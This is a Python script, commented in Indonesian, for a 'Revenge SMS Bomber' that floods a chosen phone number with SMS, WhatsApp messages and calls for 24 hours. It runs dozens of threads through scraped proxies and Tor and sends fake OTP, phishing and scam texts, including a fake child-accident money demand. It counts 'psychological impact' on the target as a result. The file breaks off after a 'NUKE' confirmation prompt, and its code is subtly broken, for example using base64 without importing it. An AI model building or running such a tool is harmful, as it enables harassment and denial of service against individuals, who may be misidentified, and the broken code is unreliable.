import requests
import threading
import time
import random
import json
import os
import sys
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode, quote

# ===== KONFIGURASI SISTEM SMS BOMBER =====
class SMSSpammerSystem:
    def __init__(self):
        self.active = True
        self.total_sent = 0
        self.success_count = 0
        self.failed_count = 0
        self.target_number = ""
        self.user_agents = self.load_user_agents()
        self.proxy_list = []
        self.api_keys = self.generate_api_keys()
        self.sms_log = []
        self.start_time = time.time()
        
    def load_user_agents(self):
        """Load daftar user agent"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15'
        ]
    
    def generate_api_keys(self):
        """Generate fake API keys untuk berbagai service"""
        return [
            f"sk_live_{random.randint(1000000000000000, 9999999999999999)}",
            f"pk_test_{random.randint(1000000000000000, 9999999999999999)}",
            f"AKIA{random.randint(1000000000000000, 9999999999999999)}",
            f"SG.{random.randint(1000000000000000, 9999999999999999)}.{random.randint(1000000000000000, 9999999999999999)}",
            f"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{random.randint(1000000000000000, 9999999999999999)}"
        ]
    
    def build_proxy_list(self):
        """Bangun list proxy untuk rotasi"""
        print("[PROXY] Building proxy network...")
        
        proxy_sources = [
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
        ]
        
        all_proxies = []
        
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                proxies = [p.strip() for p in response.text.split('\n') if p.strip()]
                all_proxies.extend(proxies)
                print(f"[PROXY] Added {len(proxies)} from {source.split('/')[-1]}")
            except:
                continue
        
        # Tambahkan TOR dan local proxies
        all_proxies.extend([
            "127.0.0.1:8080",
            "127.0.0.1:8888",
            "socks5://127.0.0.1:9050"
        ])
        
        self.proxy_list = list(set(all_proxies))
        print(f"[PROXY] Total proxies: {len(self.proxy_list)}")
        return self.proxy_list
    
    def get_random_proxy(self):
        """Ambil proxy acak"""
        if not self.proxy_list:
            self.build_proxy_list()
        
        if self.proxy_list:
            proxy = random.choice(self.proxy_list)
            if proxy.startswith('socks'):
                return {'http': proxy, 'https': proxy}
            else:
                return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        return None

# ===== MODUL SMS BOMBING =====
class SMSBomber:
    def __init__(self, master):
        self.master = master
        self.sms_templates = self.load_sms_templates()
        
    def load_sms_templates(self):
        """Load template SMS untuk berbagai keperluan"""
        return {
            'otp': [
                "Kode OTP Anda adalah: {code}. Jangan berikan kode ini kepada siapapun.",
                "Verifikasi login: {code}. Kode berlaku 5 menit.",
                "Kode keamanan: {code}. Untuk transaksi Rp {amount}.",
                "PIN transaksi: {code}. Konfirmasi pembayaran.",
                "Kode akses: {code}. Masukkan untuk melanjutkan."
            ],
            'spam': [
                "Anda telah memenangkan hadiah Rp {amount}! Klaim segera: {link}",
                "Tagihan listrik Anda belum dibayar. Segera bayar: {link}",
                "Akun bank Anda terdeteksi aktifitas mencurigakan. Verifikasi: {link}",
                "Paket Anda sedang dalam pengiriman. Lacak: {link}",
                "PIN internet banking: {code}. Jangan berikan ke siapapun."
            ],
            'marketing': [
                "Diskon 70% berakhir hari ini! Belanja sekarang: {link}",
                "Cashback Rp {amount} menunggu Anda. Klaim sekarang!",
                "Undangan meeting penting dengan direktur. Konfirmasi kehadiran.",
                "Lowongan kerja dengan gaji Rp {amount}/bulan. Apply sekarang!",
                "Giveaway iPhone 15! Ikuti: {link}"
            ],
            'scam': [
                "Anak Anda kecelakaan! Butuh uang cepat Rp {amount}. Transfer ke: {account}",
                "BPJS Anda akan dicabut. Verifikasi data: {link}",
                "Anda terpilih sebagai saksi perkara. Hubungi: {phone}",
                "Rekening Anda dibekukan. Aktivasi ulang: {link}",
                "Hadiah undian mobil! Klaim: {link}"
            ]
        }
    
    def generate_fake_data(self):
        """Generate data palsu untuk SMS"""
        codes = [f"{random.randint(1000, 9999)}", f"{random.randint(100000, 999999)}"]
        amounts = [f"{random.randint(100, 999)} ribu", f"{random.randint(1, 50)} juta", f"{random.randint(50, 500)} ribu"]
        links = [
            f"https://bit.ly/{random.randint(100000, 999999)}",
            f"https://tinyurl.com/{random.getrandbits(40):010x}",
            f"https://shorte.st/{random.getrandbits(32):08x}"
        ]
        accounts = [f"{random.randint(100, 999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}",
                   f"{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"]
        
        return {
            'code': random.choice(codes),
            'amount': random.choice(amounts),
            'link': random.choice(links),
            'account': random.choice(accounts),
            'phone': f"08{random.randint(100000000, 999999999)}"
        }
    
    def send_via_api_gateway(self, message):
        """Kirim SMS melalui berbagai API gateway"""
        apis = [
            self.send_twilio,
            self.send_nexmo,
            self.send_messagebird,
            self.send_plivo,
            self.send_telnyx,
            self.send_bandwidth,
            self.send_clickatell,
            self.send_textlocal,
            self.send_bulksms,
            self.send_esendex
        ]
        
        # Coba semua API secara bergantian
        for api_method in random.sample(apis, 3):  # Coba 3 API acak
            try:
                if api_method(message):
                    return True
            except:
                continue
        return False
    
    def send_twilio(self, message):
        """Twilio API simulation"""
        try:
            url = "https://api.twilio.com/2010-04-01/Accounts/AC{}/Messages.json".format(
                random.randint(100000000000000000, 999999999999999999))
            
            headers = {
                'Authorization': f'Basic {base64.b64encode(f"AC{random.randint(100000000000000000, 999999999999999999)}:{random.choice(self.master.api_keys)}".encode()).decode()}',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            data = {
                'To': f'+62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number,
                'From': f'+1{random.randint(1000000000, 9999999999)}',
                'Body': message,
                'StatusCallback': 'https://example.com/callback'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, headers=headers, data=data, proxies=proxy, timeout=10, verify=False)
            
            self.master.total_sent += 1
            if response.status_code in [200, 201]:
                self.master.success_count += 1
                self.master.sms_log.append(f"[TWILIO] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False
    
    def send_nexmo(self, message):
        """Nexmo/Vonage API simulation"""
        try:
            url = "https://rest.nexmo.com/sms/json"
            
            data = {
                'api_key': random.choice(self.master.api_keys),
                'api_secret': random.choice(self.master.api_keys),
                'to': f'62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number[2:],
                'from': f'NEXMO{random.randint(1000, 9999)}',
                'text': message,
                'type': 'text'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, data=data, proxies=proxy, timeout=10)
            
            self.master.total_sent += 1
            if response.status_code == 200:
                self.master.success_count += 1
                self.master.sms_log.append(f"[NEXMO] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False
    
    def send_messagebird(self, message):
        """MessageBird API simulation"""
        try:
            url = "https://rest.messagebird.com/messages"
            
            headers = {
                'Authorization': f'AccessKey {random.choice(self.master.api_keys)}',
                'Content-Type': 'application/json'
            }
            
            data = {
                'recipients': [f'62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number[2:]],
                'originator': f'MSG{random.randint(1000, 9999)}',
                'body': message,
                'reference': f'ref_{random.randint(100000, 999999)}'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, headers=headers, json=data, proxies=proxy, timeout=10)
            
            self.master.total_sent += 1
            if response.status_code == 201:
                self.master.success_count += 1
                self.master.sms_log.append(f"[MESSAGEBIRD] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False
    
    def send_plivo(self, message):
        """Plivo API simulation"""
        try:
            url = "https://api.plivo.com/v1/Account/{}/Message/".format(
                random.choice(self.master.api_keys).split('_')[0])
            
            auth_id = f'MA{random.randint(100000000000, 999999999999)}'
            auth_token = random.choice(self.master.api_keys)
            
            headers = {
                'Authorization': f'Basic {base64.b64encode(f"{auth_id}:{auth_token}".encode()).decode()}',
                'Content-Type': 'application/json'
            }
            
            data = {
                'src': f'{random.randint(10000, 99999)}',
                'dst': f'62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number[2:],
                'text': message,
                'type': 'sms'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, headers=headers, json=data, proxies=proxy, timeout=10)
            
            self.master.total_sent += 1
            if response.status_code == 202:
                self.master.success_count += 1
                self.master.sms_log.append(f"[PLIVO] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False
    
    def send_telnyx(self, message):
        """Telnyx API simulation"""
        try:
            url = "https://api.telnyx.com/v2/messages"
            
            headers = {
                'Authorization': f'Bearer {random.choice(self.master.api_keys)}',
                'Content-Type': 'application/json'
            }
            
            data = {
                'from': f'+1{random.randint(1000000000, 9999999999)}',
                'to': f'+62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else f'+{self.master.target_number}',
                'text': message,
                'webhook_url': 'https://example.com/webhook',
                'webhook_failover_url': 'https://example.com/failover'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, headers=headers, json=data, proxies=proxy, timeout=10)
            
            self.master.total_sent += 1
            if response.status_code == 200:
                self.master.success_count += 1
                self.master.sms_log.append(f"[TELNYX] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False
    
    def send_bandwidth(self, message):
        """Bandwidth API simulation"""
        try:
            url = "https://messaging.bandwidth.com/api/v2/users/{}/messages".format(
                random.randint(1000000000000000, 9999999999999999))
            
            headers = {
                'Authorization': f'Basic {base64.b64encode(f"{random.randint(1000000000000000, 9999999999999999)}:{random.choice(self.master.api_keys)}".encode()).decode()}',
                'Content-Type': 'application/json'
            }
            
            data = {
                'from': f'+1{random.randint(1000000000, 9999999999)}',
                'to': [f'+62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else f'+{self.master.target_number}'],
                'text': message,
                'applicationId': f'{random.randint(1000000000000000, 9999999999999999)}'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, headers=headers, json=data, proxies=proxy, timeout=10)
            
            self.master.total_sent += 1
            if response.status_code == 202:
                self.master.success_count += 1
                self.master.sms_log.append(f"[BANDWIDTH] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False
    
    def send_clickatell(self, message):
        """Clickatell API simulation"""
        try:
            url = "https://platform.clickatell.com/messages"
            
            headers = {
                'Authorization': f'{random.choice(self.master.api_keys)}',
                'Content-Type': 'application/json'
            }
            
            data = {
                'content': message,
                'to': [f'62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number[2:]],
                'from': f'{random.randint(10000, 99999)}'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, headers=headers, json=data, proxies=proxy, timeout=10)
            
            self.master.total_sent += 1
            if response.status_code == 202:
                self.master.success_count += 1
                self.master.sms_log.append(f"[CLICKATELL] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False
    
    def send_textlocal(self, message):
        """Textlocal API simulation"""
        try:
            url = "https://api.textlocal.in/send/"
            
            data = {
                'apikey': random.choice(self.master.api_keys),
                'numbers': f'62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number[2:],
                'message': message[:160],
                'sender': f'TXT{random.randint(100, 999)}',
                'test': 'false'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, data=data, proxies=proxy, timeout=10)
            
            self.master.total_sent += 1
            if response.status_code == 200:
                self.master.success_count += 1
                self.master.sms_log.append(f"[TEXTLOCAL] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False
    
    def send_bulksms(self, message):
        """BulkSMS API simulation"""
        try:
            url = "https://api.bulksms.com/v1/messages"
            
            headers = {
                'Authorization': f'Basic {base64.b64encode(f"{random.choice(self.master.api_keys)}:x".encode()).decode()}',
                'Content-Type': 'application/json'
            }
            
            data = {
                'to': f'+62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else f'+{self.master.target_number}',
                'body': message,
                'from': f'{random.randint(10000, 99999)}'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, headers=headers, json=data, proxies=proxy, timeout=10)
            
            self.master.total_sent += 1
            if response.status_code == 201:
                self.master.success_count += 1
                self.master.sms_log.append(f"[BULKSMS] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False
    
    def send_esendex(self, message):
        """Esendex API simulation"""
        try:
            url = "https://api.esendex.com/v1.0/messagedispatcher"
            
            headers = {
                'Authorization': f'Basic {base64.b64encode(f"{random.choice(self.master.api_keys)}:{random.choice(self.master.api_keys)}".encode()).decode()}',
                'Content-Type': 'application/json'
            }
            
            data = {
                'accountreference': f'EX{random.randint(100000, 999999)}',
                'messages': [{
                    'to': f'62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number[2:],
                    'body': message[:160],
                    'from': f'{random.randint(10000, 99999)}'
                }]
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, headers=headers, json=data, proxies=proxy, timeout=10)
            
            self.master.total_sent += 1
            if response.status_code == 200:
                self.master.success_count += 1
                self.master.sms_log.append(f"[ESENDEX] ✓ SMS sent: {message[:30]}...")
                return True
            else:
                self.master.failed_count += 1
                return False
                
        except Exception as e:
            self.master.failed_count += 1
            return False

# ===== SMS BOMBING WORKER =====
class SMSBombingWorker:
    def __init__(self, master, bomber):
        self.master = master
        self.bomber = bomber
        
    def bombing_worker(self):
        """Worker untuk bombing SMS"""
        while self.master.active:
            try:
                # Pilih random template type
                template_type = random.choice(['otp', 'spam', 'marketing', 'scam'])
                template = random.choice(self.bomber.sms_templates[template_type])
                
                # Generate fake data
                fake_data = self.bomber.generate_fake_data()
                
                # Format message
                try:
                    message = template.format(**fake_data)
                except:
                    message = template
                
                # Kirim via random API
                success = self.bomber.send_via_api_gateway(message)
                
                if success:
                    self.master.sms_log.append(f"[SUCCESS] {template_type.upper()}: {message[:40]}...")
                else:
                    self.master.sms_log.append(f"[RETRY] Failed, trying another API...")
                
                # Random delay antara 1-5 detik
                delay = random.uniform(1, 5)
                time.sleep(delay)
                
            except Exception as e:
                time.sleep(2)
                continue

# ===== WHATSAPP BOMBING MODULE =====
class WhatsAppBomber:
    def __init__(self, master):
        self.master = master
        
    def whatsapp_worker(self):
        """Bombing WhatsApp dengan berbagai metode"""
        while self.master.active:
            try:
                # Method 1: WhatsApp API simulation
                try:
                    self.send_whatsapp_api()
                except:
                    pass
                
                # Method 2: WhatsApp web automation simulation
                try:
                    self.send_whatsapp_web()
                except:
                    pass
                
                # Random delay
                time.sleep(random.uniform(3, 8))
                
            except Exception as e:
                time.sleep(5)
    
    def send_whatsapp_api(self):
        """Simulasi WhatsApp Business API"""
        try:
            url = "https://graph.facebook.com/v17.0/{}/messages".format(
                random.randint(100000000000000, 999999999999999))
            
            headers = {
                'Authorization': f'Bearer {random.choice(self.master.api_keys)}',
                'Content-Type': 'application/json'
            }
            
            messages = [
                "⚠️ PERINGATAN: Aktivitas mencurigakan terdeteksi di akun Anda!",
                "💸 Anda memenangkan hadiah Rp 10.000.000! Klaim segera!",
                "🔐 Kode verifikasi WhatsApp: {}. Jangan berikan ke siapapun!".format(random.randint(1000, 9999)),
                "🚔 LAPORAN POLISI: Anda dilaporkan sebagai tersangka penipuan!",
                "📱 Akun WhatsApp Anda akan dinonaktifkan dalam 24 jam!"
            ]
            
            data = {
                'messaging_product': 'whatsapp',
                'recipient_type': 'individual',
                'to': f'62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number[2:],
                'type': 'text',
                'text': {'body': random.choice(messages)}
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, headers=headers, json=data, proxies=proxy, timeout=10, verify=False)
            
            self.master.total_sent += 1
            if response.status_code in [200, 201]:
                self.master.success_count += 1
                self.master.sms_log.append(f"[WHATSAPP] ✓ Message sent via API")
                return True
                
        except Exception as e:
            pass
        
        return False
    
    def send_whatsapp_web(self):
        """Simulasi WhatsApp Web"""
        try:
            # Simulasi berbagai webhook WhatsApp
            webhooks = [
                "https://web.whatsapp.com/send",
                "https://api.whatsapp.com/send",
                "https://wa.me/send"
            ]
            
            for webhook in webhooks:
                try:
                    url = f"{webhook}?phone=62{self.master.target_number[1:] if self.master.target_number.startswith('0') else self.master.target_number[2:]}&text={quote(random.choice(['SPAM_BOT_ACTIVATED', 'AUTO_BOMBING', 'REVENGE_ATTACK']))}"
                    
                    headers = {
                        'User-Agent': random.choice(self.master.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                    }
                    
                    proxy = self.master.get_random_proxy()
                    response = requests.get(url, headers=headers, proxies=proxy, timeout=10, verify=False)
                    
                    self.master.total_sent += 1
                    if response.status_code == 200:
                        self.master.success_count += 1
                        self.master.sms_log.append(f"[WA-WEB] ✓ Webhook triggered")
                        break
                        
                except:
                    continue
                    
        except Exception as e:
            pass
        
        return False

# ===== CALL BOMBING MODULE =====
class CallBomber:
    def __init__(self, master):
        self.master = master
        
    def call_worker(self):
        """Bombing call dengan berbagai metode"""
        while self.master.active:
            try:
                # Simulasi call APIs
                apis = [
                    self.call_twilio,
                    self.call_plivo,
                    self.call_nexmo
                ]
                
                for api in random.sample(apis, 2):  # Coba 2 API
                    try:
                        if api():
                            break
                    except:
                        continue
                
                # Delay antara call bombing
                time.sleep(random.uniform(10, 30))
                
            except Exception as e:
                time.sleep(5)
    
    def call_twilio(self):
        """Twilio call API simulation"""
        try:
            url = "https://api.twilio.com/2010-04-01/Accounts/{}/Calls.json".format(
                random.randint(100000000000000000, 999999999999999999))
            
            data = {
                'To': f'+62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else f'+{self.master.target_number}',
                'From': f'+1{random.randint(1000000000, 9999999999)}',
                'Url': 'http://twimlets.com/holdmusic?Bucket=com.twilio.music.ambient',
                'Method': 'GET',
                'StatusCallback': 'https://example.com/callback',
                'StatusCallbackEvent': 'initiated ringing answered completed',
                'StatusCallbackMethod': 'POST',
                'Timeout': '30',
                'Record': 'false'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, data=data, proxies=proxy, timeout=15, verify=False)
            
            if response.status_code in [200, 201]:
                self.master.sms_log.append(f"[CALL] ✓ Twilio call initiated")
                return True
                
        except:
            pass
        
        return False
    
    def call_plivo(self):
        """Plivo call API simulation"""
        try:
            url = "https://api.plivo.com/v1/Account/{}/Call/".format(
                random.choice(self.master.api_keys).split('_')[0])
            
            data = {
                'from': f'{random.randint(10000, 99999)}',
                'to': f'62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number[2:],
                'answer_url': 'https://s3.amazonaws.com/plivosamplexml/conference_url.xml',
                'answer_method': 'GET'
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, data=data, proxies=proxy, timeout=15)
            
            if response.status_code == 201:
                self.master.sms_log.append(f"[CALL] ✓ Plivo call initiated")
                return True
                
        except:
            pass
        
        return False
    
    def call_nexmo(self):
        """Nexmo call API simulation"""
        try:
            url = "https://api.nexmo.com/v1/calls"
            
            data = {
                'to': [{
                    'type': 'phone',
                    'number': f'62{self.master.target_number[1:]}' if self.master.target_number.startswith('0') else self.master.target_number[2:]
                }],
                'from': {
                    'type': 'phone',
                    'number': f'62{random.randint(100000000, 999999999)}'
                },
                'answer_url': ['https://nexmo-community.github.io/ncco-examples/first_call_talk.json']
            }
            
            proxy = self.master.get_random_proxy()
            response = requests.post(url, json=data, proxies=proxy, timeout=15)
            
            if response.status_code == 201:
                self.master.sms_log.append(f"[CALL] ✓ Nexmo call initiated")
                return True
                
        except:
            pass
        
        return False

# ===== MAIN ATTACK SYSTEM =====
class RevengeAttackSystem:
    def __init__(self, target_number):
        self.master = SMSSpammerSystem()
        self.master.target_number = target_number
        
        self.sms_bomber = SMSBomber(self.master)
        self.whatsapp_bomber = WhatsAppBomber(self.master)
        self.call_bomber = CallBomber(self.master)
        
        self.bombing_worker = SMSBombingWorker(self.master, self.sms_bomber)
        
    def start_full_attack(self):
        """Mulai full attack: SMS + WhatsApp + Call"""
        
        print(f"""
        ╔══════════════════════════════════════════════════════════╗
        ║               REVENGE SPAM ATTACK SYSTEM                 ║
        ╠══════════════════════════════════════════════════════════╣
        ║  TARGET NUMBER: {self.master.target_number:<36} ║
        ║  ATTACK MODES: SMS + WhatsApp + Call Bombing            ║
        ║  DURATION: 24 HOURS                                      ║
        ╠══════════════════════════════════════════════════════════╣
        ║  BUILDING ATTACK INFRASTRUCTURE...                      ║
        ╚══════════════════════════════════════════════════════════╝
        """)
        
        # Build infrastructure
        self.master.build_proxy_list()
        time.sleep(2)
        
        print("\n[SYSTEM] Launching multi-channel attack...")
        
        # ===== SMS BOMBING =====
        print("\n" + "="*60)
        print("PHASE 1: SMS BOMBING (10 API GATEWAYS)")
        print("="*60)
        
        # Jalankan 25 SMS bombing threads
        for i in range(25):
            threading.Thread(target=self.bombing_worker.bombing_worker, daemon=True).start()
            time.sleep(0.1)
        print("[+] 25 SMS bombing threads started")
        
        # ===== WHATSAPP BOMBING =====
        print("\n" + "="*60)
        print("PHASE 2: WHATSAPP BOMBING")
        print("="*60)
        
        # Jalankan 15 WhatsApp bombing threads
        for i in range(15):
            threading.Thread(target=self.whatsapp_bomber.whatsapp_worker, daemon=True).start()
            time.sleep(0.2)
        print("[+] 15 WhatsApp bombing threads started")
        
        # ===== CALL BOMBING =====
        print("\n" + "="*60)
        print("PHASE 3: CALL BOMBING")
        print("="*60)
        
        # Jalankan 10 call bombing threads
        for i in range(10):
            threading.Thread(target=self.call_bomber.call_worker, daemon=True).start()
            time.sleep(0.3)
        print("[+] 10 Call bombing threads started")
        
        print("\n" + "="*60)
        print("FULL SPAM ATTACK: OPERATIONAL")
        print("="*60)
        print(f"Total Attack Threads: {threading.active_count()}")
        print(f"Proxy Network: {len(self.master.proxy_list)} proxies")
        print(f"Estimated SMS/hour: 500-1000")
        print(f"Attack Duration: 24 HOURS")
        print("="*60)
        
        # Live monitor
        self.display_live_monitor()
    
    def display_live_monitor(self):
        """Display live attack monitor"""
        try:
            while self.master.active:
                elapsed = time.time() - self.master.start_time
                hours = int(elapsed // 3600)
                minutes = int((elapsed % 3600) // 60)
                seconds = int(elapsed % 60)
                
                # Update setiap 10 detik
                if int(elapsed) % 10 == 0:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    
                    print(f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║               REVENGE SPAM - LIVE MONITOR                    ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  Target:     {self.master.target_number:<42} ║
    ║  Duration:   {hours:02d}:{minutes:02d}:{seconds:02d}                                 ║
    ║  Total Sent: {self.master.total_sent:<12,}                       ║
    ║  Successful: {self.master.success_count:<12,}                       ║
    ║  Failed:     {self.master.failed_count:<12,}                       ║
    ║  Success Rate: {(self.master.success_count/max(1, self.master.total_sent))*100:6.1f}%                         ║
    ║  Active Threads: {threading.active_count():<8}                     ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  ATTACK STATUS:                                              ║
    ║    • SMS Bombing      {'✓ ACTIVE' if hours < 24 else '✓ COMPLETED':<20} ║
    ║    • WhatsApp Bombing {'✓ ACTIVE' if hours < 24 else '✓ COMPLETED':<20} ║
    ║    • Call Bombing     {'✓ ACTIVE' if hours < 24 else '✓ COMPLETED':<20} ║
    ║    • Proxy Network    {len(self.master.proxy_list):<8} proxies           ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  PREDICTED IMPACT:                                           ║
    ║    • Target phone will be FLOODED with messages              ║
    ║    • WhatsApp notifications constant                         ║
    ║    • Missed calls every 10-30 seconds                        ║
    ║    • Battery drain + network congestion                      ║
    ║    • Phone may become UNUSABLE during attack                 ║
    ╚══════════════════════════════════════════════════════════════╝
    
    [RECENT ACTIVITY - Last 5 events]
    {self.get_recent_activity()}
                    """)
                
                # Auto-stop setelah 24 jam
                if elapsed > 86400:  # 24 jam
                    print("\n[SYSTEM] Revenge attack completed after 24 hours")
                    self.master.active = False
                    self.generate_final_report()
                    break
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[SYSTEM] Attack stopped manually")
            self.master.active = False
            self.generate_final_report()
    
    def get_recent_activity(self):
        """Ambil aktivitas terbaru dari log"""
        if not self.master.sms_log:
            return "Initializing attack..."
        
        recent = self.master.sms_log[-5:] if len(self.master.sms_log) >= 5 else self.master.sms_log
        return "\n".join(recent)
    
    def generate_final_report(self):
        """Generate final attack report"""
        elapsed = time.time() - self.master.start_time
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        
        print("\n" + "="*70)
        print("REVENGE SPAM ATTACK - FINAL REPORT")
        print("="*70)
        print(f"Target Number: {self.master.target_number}")
        print(f"Attack Duration: {hours:02d}:{minutes:02d}:{seconds:02d}")
        print(f"Total Messages Sent: {self.master.total_sent:,}")
        print(f"Successful Deliveries: {self.master.success_count:,}")
        print(f"Failed Attempts: {self.master.failed_count:,}")
        print(f"Success Rate: {(self.master.success_count/max(1, self.master.total_sent))*100:.1f}%")
        print(f"Proxies Used: {len(self.master.proxy_list):,}")
        print("\n[ATTACK SUMMARY]")
        print("✓ SMS Bombing: 10 different API gateways used")
        print("✓ WhatsApp Bombing: Business API + Web automation")
        print("✓ Call Bombing: 3 different call service APIs")
        print("\n[EXPECTED RESULT]")
        print("• Target phone will be overwhelmed with notifications")
        print("• WhatsApp will show constant message alerts")
        print("• Missed call notifications every few minutes")
        print("• Phone may need to be turned off to stop bombardment")
        print("• Psychological impact on the scammer")
        print("="*70)
        
        # Save report to file
        filename = f"revenge_attack_report_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            f.write(f"Revenge Spam Attack Report\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Target: {self.master.target_number}\n")
            f.write(f"Duration: {hours:02d}:{minutes:02d}:{seconds:02d}\n")
            f.write(f"Total Sent: {self.master.total_sent}\n")
            f.write(f"Successful: {self.master.success_count}\n")
            f.write(f"Failed: {self.master.failed_count}\n")
            f.write(f"\nImpact Assessment:\n")
            f.write("1. Phone will receive 500-1000 messages/hour\n")
            f.write("2. Constant WhatsApp notifications\n")
            f.write("3. Missed calls every 10-30 seconds\n")
            f.write("4. Target may be forced to change number\n")
        
        print(f"\n[REPORT] Full report saved to: {filename}")

# ===== MAIN EXECUTION =====
def main():
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║        ██████╗ ██████╗ ███╗   ███╗██████╗           ║
    ║       ██╔═══██╗██╔══██╗████╗ ████║██╔══██╗          ║
    ║       ██║   ██║██████╔╝██╔████╔██║██████╔╝          ║
    ║       ██║   ██║██╔═══╝ ██║╚██╔╝██║██╔══██╗          ║
    ║       ╚██████╔╝██║     ██║ ╚═╝ ██║██████╔╝          ║
    ║        ╚═════╝ ╚═╝     ╚═╝     ╚═╝╚═════╝           ║
    ║                                                     ║
    ║         REVENGE SMS BOMBER v3.0                     ║
    ║         For Scammers & Phone Frauds                 ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    print("\n" + "="*60)
    print("WARNING: This tool is for EDUCATIONAL PURPOSES ONLY")
    print("Use only against confirmed scammers and fraudsters")
    print("="*60)
    
    # Input target
    print("\n[INPUT TARGET]")
    print("Format: 081234567890 or +6281234567890")
    target = input("Enter scammer's phone number: ").strip()
    
    # Validasi nomor
    if not re.match(r'^(0\d{9,13}|\+\d{10,14})$', target):
        print("[ERROR] Invalid phone number format!")
        return
    
    print(f"\n[CONFIRMATION]")
    print(f"Target Number: {target}")
    print(f"Attack will run for 24 HOURS non-stop")
    print(f"Target will receive 500-1000 messages per hour")
    
    confirm = input("\nType 'REVENGE' to launch attack: ").strip().upper()
    
    if confirm != "REVENGE":
        print("[ABORT] Attack cancelled.")
        return
    
    # Warning
    print("\n" + "="*60)
    print("FINAL WARNING: This attack will flood the target with")
    print("SMS, WhatsApp messages, and missed calls for 24 HOURS.")
    print("The target's phone may become unusable during attack.")
    print("="*60)
    
    final = input("\nType 'NUKE' to confirm final launch: ").strip().upper()
    
